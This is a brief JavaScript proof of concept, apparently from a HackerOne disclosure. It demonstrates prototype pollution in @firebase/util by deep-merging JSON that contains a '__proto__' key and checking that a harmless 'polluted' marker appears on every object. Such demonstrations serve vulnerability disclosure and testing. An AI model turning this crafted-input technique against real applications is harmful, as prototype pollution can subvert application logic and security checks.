// //https://hackerone.com/reports/1001218
// test("prototype pollution in @firebase/util", () => {
console.log({}.polluted);

  const utils = require("@firebase/util");
  const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  utils.deepExtend({}, source);

console.log({}.polluted);
// });
